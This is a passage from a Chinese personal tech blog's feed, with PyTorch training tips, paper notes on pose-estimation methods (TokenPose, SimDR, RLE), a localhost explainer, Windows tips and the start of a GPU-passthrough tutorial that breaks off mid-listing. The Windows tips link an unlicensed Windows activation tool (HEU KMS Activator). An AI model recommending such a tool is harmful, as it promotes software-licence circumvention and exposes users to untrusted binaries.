class="number">0.0000</span>,  <span class="number">0.0000</span>,  <span class="number">0.0000</span>,  <span class="number">0.0000</span>,  <span class="number">0.0000</span>,  <span class="number">0.0000</span>,  <span class="number">0.0000</span>,</span><br><span class="line"><span class="number">0.0000</span>,  <span class="number">0.0000</span>]])</span><br><span class="line">tensor([-<span class="number">0.1192</span>,  <span class="number">0.0000</span>])</span><br></pre></td></tr></table></figure><p>第二次loss.backward(retain_graph&#x3D;True)，输出为:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tensor([[ <span class="number">0.0987</span>, -<span class="number">0.1163</span>, -<span class="number">0.0902</span>,  <span class="number">0.0969</span>,  <span class="number">0.2295</span>,  <span class="number">0.2825</span>, -<span class="number">0.1424</span>, -<span class="number">0.2917</span>,</span><br><span class="line"><span class="number">0.2180</span>, -<span class="number">0.1792</span>],</span><br><span class="line">[ <span class="number">0.0000</span>,  <span class="number">0.0000</span>,  <span class="number">0.0000</span>,  <span class="number">0.0000</span>,  <span class="number">0.0000</span>,  <span class="number">0.0000</span>,  <span class="number">0.0000</span>,  <span class="number">0.0000</span>,</span><br><span class="line"><span class="number">0.0000</span>,  <span class="number">0.0000</span>]])</span><br><span class="line">tensor([-<span class="number">0.2383</span>,  <span class="number">0.0000</span>])</span><br></pre></td></tr></table></figure><p>运行一次opt.zero_grad()，输出为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tensor([[<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>],</span><br><span class="line">[<span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>, <span class="number">0.</span>]])</span><br><span class="line">tensor([<span class="number">0.</span>, <span class="number">0.</span>])</span><br></pre></td></tr></table></figure><blockquote><p>现在明白为什么我们一般在求梯度时要用opt.zero_grad()了吧，那是为了不要这次的梯度结果被上一次给影响，但是在某些情况下这个‘影响’是可以利用的。</p></blockquote><h2 id="扩充Batch"><a href="#扩充Batch" class="headerlink" title="扩充Batch"></a>扩充Batch</h2><blockquote><p>可以通过滞后zero_grad实现batch扩大</p></blockquote><h1 id="问题汇总"><a href="#问题汇总" class="headerlink" title="问题汇总"></a>问题汇总</h1><h2 id="Expected-object-of-device-type-cuda-but-got-device-type-cpu"><a href="#Expected-object-of-device-type-cuda-but-got-device-type-cpu" class="headerlink" title="Expected object of device type cuda but got device type cpu"></a>Expected object of device type cuda but got device type cpu</h2><p>这种问题一般是由于to(device)使用不规范导致的。同时to(device)操作也容易导致性能下降。这里建议在模型已经在cuda上的时候，使用like的操作来生成需要的张量数据:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">torch.zeros_like()</span><br><span class="line">torch.ones_like()</span><br><span class="line">torch.rand_like()</span><br><span class="line">torch.randn_like()</span><br><span class="line">torch.randint_like()</span><br><span class="line">torch.empty_like()</span><br><span class="line">torch.full_like()</span><br></pre></td></tr></table></figure><h2 id="AssertionError-nn-criterions-don’t-compute-the-gradient-w-r-t-targets-please-mark-these-variables-as-volatile-or-not-requiring-gradients"><a href="#AssertionError-nn-criterions-don’t-compute-the-gradient-w-r-t-targets-please-mark-these-variables-as-volatile-or-not-requiring-gradients" class="headerlink" title="AssertionError: nn criterions don’t compute the gradient w.r.t. targets please mark these variables as volatile or not requiring gradients"></a>AssertionError: nn criterions don’t compute the gradient w.r.t. targets please mark these variables as volatile or not requiring gradients</h2><p>表示target是需要一个不能被训练的，也就是requires_grad&#x3D;False的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 示例</span></span><br><span class="line">loss = nn.MSELoss()</span><br><span class="line"><span class="built_in">input</span> = torch.randn(<span class="number">3</span>, <span class="number">5</span>, requires_grad=<span class="literal">True</span>)</span><br><span class="line">target = torch.randn(<span class="number">3</span>, <span class="number">5</span>)</span><br><span class="line">output = loss(<span class="built_in">input</span>, target)</span><br><span class="line">output.backward()</span><br></pre></td></tr></table></figure><blockquote><p>MSELoss，和其他很多loss，比如交叉熵，KL散度等，其target都需要是一个不能被训练的值的，这个和TensorFlow中的tf.nn.softmax_cross_entropy_with_logits_v2不太一样，后者可以使用可训练的target。</p></blockquote><h1 id="必知必会"><a href="#必知必会" class="headerlink" title="必知必会"></a>必知必会</h1><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>合适的初始化很重要，初始化就跟黑科技一样，用对了超参都不用调；没用对，跑出来的结果就跟模型有bug一样不忍直视。<br>优选xavier初始化或者He初始化。</p><h2 id="1xN卷积"><a href="#1xN卷积" class="headerlink" title="1xN卷积"></a>1xN卷积</h2><p>适当使用，可能得到更好的泛化效果：</p><ol><li>卷积可以减少计算量</li><li>可以在某个方向强调感受野，也就是说假如如果你要对一个长方形形状的目标进行分类，你可以使用的卷积核搭配的卷积核对长边方向设定更大的感受野</li></ol><h2 id="ACNet结构"><a href="#ACNet结构" class="headerlink" title="ACNet结构"></a>ACNet结构</h2><p>在3x3卷积的基础上加上1x3和3x1的旁路卷积核，最后在推理阶段把三个卷积核都fusion到3x3卷积核上，在许多经典CV任务上都可以获得大概1个点的提升。</p><h2 id="BN"><a href="#BN" class="headerlink" title="BN"></a>BN</h2><p>加速收敛。</p><blockquote><p>如果有BN了全连接层就没必要加Dropout了。</p></blockquote><h2 id="fpn结构"><a href="#fpn结构" class="headerlink" title="fpn结构"></a>fpn结构</h2><p>目标检测<strong>不能盲目</strong>去掉fpn结构。在针对自己的数据调检测任务如yolov3的时候不能盲目砍掉fpn结构，尽管你分析出某个分支的Anchor基本不可能会对你预测的目标起作用，但如果你直接去掉分支很可能会带来漏检。</p><h2 id="激活函数"><a href="#激活函数" class="headerlink" title="激活函数"></a>激活函数</h2><p>可以先用ReLU做一版，如果想再提升精度可以将ReLU改成PReLU试试。我更倾向于直接使用ReLU。</p><h2 id="batch-size"><a href="#batch-size" class="headerlink" title="batch_size"></a>batch_size</h2><p>在不同类型的任务中，batch_size的影响也不同。</p><h2 id="loss"><a href="#loss" class="headerlink" title="loss"></a>loss</h2><p>用loss的时候往往并不是直接替换loss那么简单，需要仔细思考loss背后的数学原理，要用对地方才可有提升。<br><a href="https://www.zhihu.com/question/293369755">为什么 YOLOv3 用了 Focal Loss 后 mAP 反而掉了？</a></p><h2 id="backbone"><a href="#backbone" class="headerlink" title="backbone"></a>backbone</h2><p>使用了带backbone的网络，如训练VGG16-SSD建议选择finetune的方式，从头训练不仅费时费力，甚至难以收敛。</p><h2 id="upsampling"><a href="#upsampling" class="headerlink" title="upsampling"></a>upsampling</h2><p>在做分割实验的时候我发现用upsamling 加1*1卷积代替反卷积做上采样得到的结果更平滑，并且miou差距不大，所以我认为这两者都是都可以使用的。</p><h2 id="框过多也是需要优化的"><a href="#框过多也是需要优化的" class="headerlink" title="框过多也是需要优化的"></a>框过多也是需要优化的</h2><p>一些Anchor-based目标检测算法为了提高精度，都是疯狂给框，ap值确实上去了，但也导致了fp会很多，并且这部分fp没有回归，在nms阶段也滤不掉。相比于ap提升而言，工程上减少fp更加重要。Gaussian yolov3的fp相比于yolov3会减少40％</p><h2 id="epoch-or-iteration"><a href="#epoch-or-iteration" class="headerlink" title="epoch or iteration"></a>epoch or iteration</h2><h3 id="what-1"><a href="#what-1" class="headerlink" title="what"></a>what</h3><p>现在主要有4种迭代参数的方式：</p><ol><li>Loss&#x2F;Epoch：告诉你一个模型要观察同一张图片多少次才能理解它(遍历所有数据才进行更新)</li><li>Loss&#x2F;Iteration：告诉你需要多少次参数更新。(由于每次Batch的采样已经是独立同分布)(比较优化器时这很有用，可以帮助你加快训练速度或达到更高的精度)</li><li>Loss&#x2F;Total Image Seen(iteration * batchsize)：告诉你算法看到了多少图像时的损失。适合比较两种算法使用数据的效率。并能够消除Batchsize的影响，这允许在不同GPU上训练的具有不同Batch Size的模型之间进行公平地比较。</li><li>Loss&#x2F;Time(on specific dedicated gpu(s))</li></ol><h2 id="seed"><a href="#seed" class="headerlink" title="seed"></a>seed</h2><p>需要为Pytorch和numpy分别设置各自的随机生成数。<br>比如在进行DataLoader的时候，使用worker_init_fn选项专门设置 seed，否则在 PyTorch 同时使用 NumPy 的随机数生成器和多进程数据加载会导致相同的扩充数据。用户没有这样做，因而这个 bug 悄悄地降低了模型的准确率。<br><strong>如果不针对生成则会使用同一个生成数从而降低模型的准确率。</strong></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://cloud.tencent.com/developer/article/1684007">池化</a><br><a href="https://www.sohu.com/a/442710521_823210">池化2</a><br><a href="https://zhuanlan.zhihu.com/p/103342289">平移</a><br><a href="https://zhuanlan.zhihu.com/p/38024868">2</a><br><a href="https://zhuanlan.zhihu.com/p/34169502">自定义op</a><br><a href="https://bbs.csdn.net/topics/390798229?utm_medium=distribute.pc_relevant.none-task-discussion_topic-BlogCommendFromBaidu-1.control&depth_1-utm_source=distribute.pc_relevant.none-task-discussion_topic-BlogCommendFromBaidu-1.control">2</a><br><a href="https://mp.weixin.qq.com/s/gNFfBXktyPBJAjJHgGCJkw">反向传播</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzI5MDUyMDIxNA==&mid=2247525289&idx=3&sn=2c42a67f4ec09620b717ced2c0e2e3c9&chksm=ec1c8e50db6b0746ed36cefe03e85477bf7c1511c9cddd5d5789b689fd755a387d918bff0467&mpshare=1&scene=24&srcid=1208mmcGeXYiZoC6X77ycvPx&sharer_sharetime=1607436292561&sharer_shareid=8d17b4e80d81af2331e5d78c79a59f63#rd">SBN</a></p><h1 id="推荐库"><a href="#推荐库" class="headerlink" title="推荐库"></a>推荐库</h1><h2 id="kornia"><a href="#kornia" class="headerlink" title="kornia"></a>kornia</h2><p>可以进行Tesnor操作的现代化opencv(针对numpy)。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Pytorch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TokenPose</title>
      <link href="/2022/04/14/TokenPose/"/>
      <url>/2022/04/14/TokenPose/</url>
      
        <content type="html"><![CDATA[<p>URL:<br>NAME: TokenPose: Learning Keypoint Tokens for Human Pose Estimation<br>AUTHOR: 清华，旷视<br>YEAR: 2021.4<br>PUBLISHED: ICCV<br>TAG: ((620602d4-e403-40ec-9508-dba5cdc03e26)), ((62064c08-e692-41af-a9e5-d5b1dead5872))<br>CODE: <a href="https://github.com/leeyegy/TokenPose">https://github.com/leeyegy/TokenPose</a><br>IN A WORD:</p><h1 id="why"><a href="#why" class="headerlink" title="why"></a>why</h1><p>CNN网络缺乏显式学习关键点联系的能力。所以本文想借用Transformer的全局能力突出关键点。</p><h1 id="what"><a href="#what" class="headerlink" title="what"></a>what</h1><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649916784269_0.png" alt="image.png"><br>这里画得是利用CNN划分patch到1D的特征向量，但是文中说的是使用ViT的方式来生成patch的，有歧义，但是问题不大。<br>同样需要进行位置编码。有一个问题，好像没有像ViT一样增加cls token。之后网络额外增加了keypoint token，长度与每个patch的长度是一致的。<br>最后网络的输入是{[visual, keypoint]}的组合。每个Transformer Layer包括一个多头注意力模块和MLP模块。<br>给人的感觉类似于将模板匹配了。</p><h2 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h2><ol><li>如果构建关键点patch</li><li>这个CNN到底和ViT有啥关系</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 姿态估计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SimDR</title>
      <link href="/2022/04/14/SimDR/"/>
      <url>/2022/04/14/SimDR/</url>
      
        <content type="html"><![CDATA[<p>URL:<br>NAME: Is 2D Heatmap Representation Even Necessary for Human Pose Estimation?<br>AUTHOR: 清华 旷视<br>YEAR: 2021<br>PUBLISHED:<br>TAG: ((620602d4-e403-40ec-9508-dba5cdc03e26))<br>CODE: <a href="https://github.com/leeyegy/SimDR">https://github.com/leeyegy/SimDR</a><br>IN A WORD: 相较与热图操作，少了一个偏移回归的操作<br>[[SimDR CODE]]</p><h1 id="why"><a href="#why" class="headerlink" title="why"></a>why</h1><p>先前的姿态估计方法都是从2D高斯热图出发，这极大的限制了姿态估计发展前景。</p><h2 id="Heatmap"><a href="#Heatmap" class="headerlink" title="Heatmap"></a>Heatmap</h2><ol><li><strong>在低分辨率图片上掉点严重</strong>：对于HRNet-W48，当输入分辨率从256x256降到64x64，AP会从75.1掉到48.5</li><li><strong>为了提升精度，需要多个上采样层来将特征图分辨率由低向高进行恢复</strong>：通常来说上采样会使用转置卷积来获得更好的性能，但相应的计算量也更大，骨干网络输出的特征图原本通道数就已经很高了，再上采样带来的开销是非常庞大的</li><li><strong>需要额外的后处理来减小尺度下降带来的量化误差</strong>：如DARK修正高斯分布，用argmax获取平面上的极值点坐标等。传统的Heatmap尺寸往往小于原始图片尺寸，因而最后通过argmax得到的坐标放大会原图，就会出现量化误差。</li></ol><h1 id="what"><a href="#what" class="headerlink" title="what"></a>what</h1><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649310168783_0.png" alt="image.png"><br>本文提出了一种姿态估计的解耦坐标表征，Simple Disentagled coordinate Representation(SimDR)，<strong>将关键点坐标(x,y) 用2条独立的、长度等于或高于原图片尺寸的一维向量进行表征。</strong></p><blockquote><p>提出了一种表征方式，可以作用到CNN或Transformer网络上，效果都不错。</p></blockquote><h1 id="how"><a href="#how" class="headerlink" title="how"></a>how</h1><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649311054013_0.png" alt="image.png"><br>Encoder由2部分组成，Neural Network：SimpleBaseline 或者HRNet； 关键点嵌入：${K_i}^n_{i&#x3D;1}, {K_i\in \mathcal{R}^d}$, 将featmaps转换为$n\times d$的形式，n表示关键点的类型(也就是说针对每个类型都进行关键点的嵌入，对应的应该就是final_layer-&gt;16个通道对应16个关键点位置)<br>SimDR Head：通过共享的Linear Projection将每个嵌入特征转换为2个1D的向量$(o_x^i, o_y^i)$, 长度分别为$W\cdot k$和$H\cdot k$。(Linear Projection为全链接层，4096-&gt; x y图像输入的尺度*simdr_split_ratio，❓唯一的问题是这里需要将16个通道的热图每个都展平成4096维度的向量，是否能够成立？)</p>]]></content>
      
      
      
        <tags>
            
            <tag> 姿态估计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RLE</title>
      <link href="/2022/04/14/RLE/"/>
      <url>/2022/04/14/RLE/</url>
      
        <content type="html"><![CDATA[<p>URL:<br>NAME: Human Pose Regression with Residual Log-likelihood Estimation<br>AUTHOR:<br>YEAR: 2021<br>PUBLISHED: ICCV<br>TAG: ((620602d4-e403-40ec-9508-dba5cdc03e26))<br>CODE: <a href="https://github.com/Jeff-sjtu/res-loglikelihood-regression">https://github.com/Jeff-sjtu/res-loglikelihood-regression</a><br>IN A WORD:<br>[[RLE CODE]]</p><h1 id="why"><a href="#why" class="headerlink" title="why"></a>why</h1><h2 id="高斯热图的优势"><a href="#高斯热图的优势" class="headerlink" title="高斯热图的优势"></a>高斯热图的优势</h2><ol><li>全卷积的结构能够完整地保留位置信息，因此<strong>高斯热图的空间泛化能力更强</strong>。而回归方法因为最后需要将图片向量展开成一个长长的一维向量，reshape 过程中会对位置信息有所丢失。除此之外，全联接网络需要将位置信息转化为坐标值，对于这种隐晦的信息转化过程，其非线性是极强的，因此不好训练和收敛；</li><li><strong>关节点之间存在相互联系</strong>。以脖子和肩膀为例，这两个地方常常会挨得比较近，因此空间上是存在相关性的。高斯热图可以在一张图中保留这种相关性，因此已知脖子的位置可以帮助估计肩膀，而已知肩膀的位置也能帮助估计脖子。但是，回归坐标时是对 k 个坐标点分别回归的，没办法照顾到这种关节间的相关性；</li><li>高斯热图有点类似分类问题中的<strong>软标注</strong>。它在目标位置上加上了一个渐进的分布过程，这能帮助网络更平滑地找到梯度下降的过程。同时软标注也减轻了在标注有误情况下的过拟合情况(应该就是标签平滑技术)。</li></ol><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ol><li>基于热图的方法需要大尺寸的热图，所以计算量大。这导致学术研究与算法落地的割裂。</li><li>存在图像缩放导致的量化问题</li></ol><h2 id="贡献"><a href="#贡献" class="headerlink" title="贡献"></a>贡献</h2><ol><li>没有高分辨率热图，计算代价低</li><li>输出为连续的，量化误差小。（Heatmap-based输出的热图最大值点在哪，对应到原图的点也就确定了，输出热图的分辨率越小，这个点放大后对应回去就越不准。Regression-based输出为一个数值，小数点后可以有很多位，精度不受缩放影响）</li><li>可扩展性强。不论是one-stage还是two-stage，image-based还是video-based，2D还是3D，Regression-based方法都可以一把梭。此前就有用这种方法来将2D和3D数据放在一起联合训练的文章。这是Heatmap-based方法做不到的，因为输出是高度定制化的，2D输出必须渲染2D高斯热图，3D就必须渲染3D的高斯热图，计算量和内存开销也蹭蹭蹭地暴涨。</li></ol><h1 id="what"><a href="#what" class="headerlink" title="what"></a>what</h1><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649813721333_0.png" alt="image.png"></p><h2 id="Heatmap-based"><a href="#Heatmap-based" class="headerlink" title="Heatmap-based"></a>Heatmap-based</h2><p>基于热图的方式需要额外预测一个偏移，因为缩放会导致误差。</p><h2 id="Standard-Regression-Paradigm"><a href="#Standard-Regression-Paradigm" class="headerlink" title="Standard Regression Paradigm"></a>Standard Regression Paradigm</h2><p>传统的方法通过maximum likelihood estimation(MLE)实现，整体的预测可以使用公式表示为：<br>$$\mathcal{L}<em>{mle}&#x3D;-logP</em>{\Theta}(x|\mathcal{I})|_{x&#x3D;\mu_g}$$<br>$\mathcal{I}$表示输入的预测图像，x为GT出现的位置，$\Theta$是网络的可学习参数。输出网络在GT($x&#x3D;\mu_g$)位置的时候的偏差作为损失。由于我们默认分布的尽头的是高斯分布，而高斯分布需要预测2个值，均值和方差。利用高斯分布表示MLE：<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649815044591_0.png" alt="image.png"><br>$\propto$表示近似于的意思，因为高斯分布的写法为$\frac{1}{\sqrt{2\pi}\hat{\sigma}}e^{-\frac{(x-\hat{\mu})^2}{2\hat{\sigma}^2}}$，前面的常量被简化掉了。从高斯图中可以看出来，我们要预测的结果应该尽可能靠近均值，这样是GT位置的概率越大，而方差主要影响曲线的平滑度，所以可以将方差看做常量(对概率的影响较小)，这样这个损失能够退化为$L_2 loss$，更进一步，我们假设这个分布是Laplace 分布，那么这个损失将退化为$L_1 loss$。<br><strong>网络将直接以$\hat{\mu}$作为推理的输出。</strong></p><h3 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h3><p>但是由于网络的潜在分布是未知的，我们很难用这种简单的高斯分布模型去拟合。</p><h2 id="Regression-with-Normalizing-Flows"><a href="#Regression-with-Normalizing-Flows" class="headerlink" title="Regression with Normalizing Flows"></a>Regression with Normalizing Flows</h2><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649815844751_0.png" alt="image.png"><br>主体思想就一点：网络能够去预测一个简单的高斯回归分布，那么我们再让这个回归分布去还原出网络的真实分布(通过Normalizing Flow)。这里提出了3种设计方法。</p><h3 id="Basic-Design"><a href="#Basic-Design" class="headerlink" title="Basic Design"></a>Basic Design</h3><p>就是先通过回归模型预测简单的分布，然后通过normalizing flow转换为目标复杂函数。但是flow的目的是分布的学习。<br><strong>缺陷</strong>： 网络的目的是学习输出的位置概率，而不是当前分布相对于真实分布的概率，所以这种方式表述的不准确。</p><h3 id="Direct-likeihood-estimation-with-reparameterization"><a href="#Direct-likeihood-estimation-with-reparameterization" class="headerlink" title="Direct likeihood estimation with reparameterization"></a>Direct likeihood estimation with reparameterization</h3><p>为了能够更好的利用现有的flow 模型，本文采用了重参数的策略。<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649816549126_0.png" alt="image.png"><br>这里主要与b模型图对应，$x$表示实际分布下的位置，$\bar{\mu_g}$是简单分布下的位置。这里涉及到了normalizing flow的设计，不懂，但是这种转换之后，实际的分布的均值和方差也好表达了。<br><strong>缺陷</strong>：虽然当前的模型能够表达位置的概率了，但是它强依赖于回归模型和flow 模型，回归模型又依赖与flow 模型。这使得开始训练的时候，模型的分布是很难训练的。</p><h3 id="Residual-Log-likelihood-Estimation"><a href="#Residual-Log-likelihood-Estimation" class="headerlink" title="Residual Log-likelihood Estimation"></a>Residual Log-likelihood Estimation</h3><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1649817049776_0.png" alt="image.png"><br>进一步的表达成了Q预测的简单分布，G flow网络学习到的分布。s看论文，太长了。</p><h1 id="how"><a href="#how" class="headerlink" title="how"></a>how</h1><p>利用RealNVP作为flow 模型。<br>初始假设模型服从Laplace 分布进行训练。在推理的时候，直接将网络的预测$\hat{\mu}$作为输出。</p><h1 id="where"><a href="#where" class="headerlink" title="where"></a>where</h1><p>学不来了啊，这里的Normal Flow模型怎么训练的都不知道，我学不动啦，救命啊！！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> 姿态估计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>localhost</title>
      <link href="/2022/04/13/localhost/"/>
      <url>/2022/04/13/localhost/</url>
      
        <content type="html"><![CDATA[<p>Localhost通常被认为是 IP 地址 127.0.0.1 的同义词, 但是它们并不是一个意思。</p><h1 id="差别"><a href="#差别" class="headerlink" title="差别"></a>差别</h1><h2 id="范围"><a href="#范围" class="headerlink" title="范围"></a>范围</h2><p>localhost 是一个别名，用于指代为环回保留的 IP 地址。尽管使用<strong>127.0.0.1</strong>是最常见的做法，但IPv4 网络标准为 localhost保留了<strong>127.0.0.1 – 127.255.255.255范围。</strong>而IPv6<strong>保留</strong>第一个（简而言之，0:0:0:0:0:0:0:1 - 或 : :1）作为其环回地址。</p><p>所以可以江localhost设置到其他的ip上，通过etc&#x2F;hosts修改，但是不建议这么做。</p><h1 id="工作方式"><a href="#工作方式" class="headerlink" title="工作方式"></a>工作方式</h1><p>在使用127.0.0.1访问的时候会通过网卡，这可能会受到防火墙设置和配置的影响。而 localhost ping 环回地址时，请求不会通过网卡。</p><h1 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h1><h2 id="阻止网站"><a href="#阻止网站" class="headerlink" title="阻止网站"></a>阻止网站</h2><p>使用 localhost 属性可以直接在所有浏览器上阻止特定网站。为此，您需要编辑主机文件（etc&#x2F;hosts）——一个包含 IP 地址到主机名的映射的文件。主机文件由两列组成，其中一列是为 IP 地址保留的，另一列是为其对应的主机名保留的。</p><p>向文件中添加一个新条目并将 localhost IP 地址 127.0.0.1 分配给给定的主机名以阻止网站。这样做可以防止系统通过 Internet 查找站点。相反，它使用 127.0.0.1 在本地服务器上搜索它。最后，由于它无法响应请求，浏览器会响应它无法连接到想要的站点。</p><h2 id="测试-Web-应用程序和程序"><a href="#测试-Web-应用程序和程序" class="headerlink" title="测试 Web 应用程序和程序"></a>测试 Web 应用程序和程序</h2><p>它的主要优点是允许开发人员在不上网的情况下模拟连接。由于在将应用程序公开到 Internet 之前对其进行测试非常重要，因此利用 localhost 可以通过环回测试所有功能。</p><p>此外，本地服务器环境加快了开发速度，因为 ping localhost 的响应时间比通过 Internet 的远程计算机要快得多。</p><h2 id="在本地托管-Web-应用程序"><a href="#在本地托管-Web-应用程序" class="headerlink" title="在本地托管 Web 应用程序"></a>在本地托管 Web 应用程序</h2><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol><li><a href="https://mp.weixin.qq.com/s?__biz=MjM5NDEwNzc0MQ==&mid=2650958962&idx=1&sn=e024763ac643473c92b9a65875ea89a9&chksm=bd7a14408a0d9d56392586835534c0ca3e5c45419095fb6fb1fd5c884219abe74a2097d6f21e&mpshare=1&scene=24&srcid=0413AMTEB1YyVUB9nQl03m7x&sharer_sharetime=1649812777595&sharer_shareid=09e89c3eeb6a32446c35165e145dbd13#rd">聆听世界的鱼</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows</title>
      <link href="/2022/04/13/windows/"/>
      <url>/2022/04/13/windows/</url>
      
        <content type="html"><![CDATA[<h1 id="无法登入账户"><a href="#无法登入账户" class="headerlink" title="无法登入账户"></a>无法登入账户</h1><p>通过重置internetExplorer修复：</p><p>1.在Internet Explorer浏览器的右上角点击设置，打开“Internet选项”。</p><p>2.在“Internet选项”界面，进入“常规”，单击“删除”，再点击“确定”，缓存文件就已经全部删除。</p><p>3.在“Internet选项”界面，进入“高级”， 单击 “重置”，即可。</p><p>4.按Windows+R输入services.msc找到Microsoft Account Sign-in Assistant右击启动，然后点击“属性”将启动类型设置为“自动”。</p><h1 id="terminal下启用代理"><a href="#terminal下启用代理" class="headerlink" title="terminal下启用代理"></a>terminal下启用代理</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">cmd</span></span><br><span class="line">set http_proxy=http://127.0.0.1:12333 &amp; set https_proxy=http://127.0.0.1:12333</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">powershell</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">Env:http_proxy=<span class="string">&quot;&lt;http://127.0.0.1:12333&gt;&quot;</span>;<span class="variable">$Env</span>:https_proxy=<span class="string">&quot;&lt;http://127.0.0.1:12333&gt;&quot;</span></span></span><br></pre></td></tr></table></figure><h1 id="esp扩容"><a href="#esp扩容" class="headerlink" title="esp扩容"></a>esp扩容</h1><p>直接生成一个新的空间把EFI文件夹整个迁移过去就行，没有花里胡哨</p><h1 id="截图快捷键"><a href="#截图快捷键" class="headerlink" title="截图快捷键"></a>截图快捷键</h1><p>win+shift+s</p><h1 id="激活工具"><a href="#激活工具" class="headerlink" title="激活工具"></a>激活工具</h1><p><a href="https://mp.weixin.qq.com/s/EJxyQT6qTb9oo3yDTuNhMQ">HEU KMS Activator</a></p>]]></content>
      
      
      <categories>
          
          <category> Win </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>单显卡直通</title>
      <link href="/2022/04/12/%E5%8D%95%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/"/>
      <url>/2022/04/12/%E5%8D%95%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/</url>
      
        <content type="html"><![CDATA[<p>本教程在ubuntu下实现。具体实现参考了ledisbest[^1]的教程。</p><h1 id="配置一个可用的虚拟机"><a href="#配置一个可用的虚拟机" class="headerlink" title="配置一个可用的虚拟机"></a>配置一个可用的虚拟机</h1><h2 id="CPU开启iommu"><a href="#CPU开启iommu" class="headerlink" title="CPU开启iommu"></a>CPU开启iommu</h2><h3 id="需要在bios里开启虚拟化技术"><a href="#需要在bios里开启虚拟化技术" class="headerlink" title="需要在bios里开启虚拟化技术"></a>需要在bios里开启虚拟化技术</h3><p>不同牌子的设置不同的</p><h3 id="x2F-etc-x2F-default-x2F-grub"><a href="#x2F-etc-x2F-default-x2F-grub" class="headerlink" title="&#x2F;etc&#x2F;default&#x2F;grub"></a>&#x2F;etc&#x2F;default&#x2F;grub</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GRUB_CMDLINE_LINUX=&quot;crashkernel=auto rhgb quiet amd_iommu=on iommu=pt&quot;</span><br><span class="line">(amd_iommu/intel_iommu/AuthenticAMD)</span><br></pre></td></tr></table></figure><h3 id="更新引导"><a href="#更新引导" class="headerlink" title="更新引导"></a>更新引导</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo update-grub</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">并查看是否启动成功</span></span><br><span class="line">dmesg | grep -E &quot;DMAR|IOMMU&quot;</span><br></pre></td></tr></table></figure><h3 id="查看iommu组是否有效"><a href="#查看iommu组是否有效" class="headerlink" title="查看iommu组是否有效"></a>查看iommu组是否有效</h3><p>使用LEDs-single-gpu-passthrough&#x2F; resources &#x2F; iommuamd.sh脚本查看，需要保证显卡的所有项在一个组下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IOMMU group 16</span><br><span class="line">0a:00.0 VGA compatible controller \[0300\]: Advanced Micro Devices, Inc. \[AMD/ATI\] Baffin \[Radeon RX 550 640SP / RX 560/560X\] 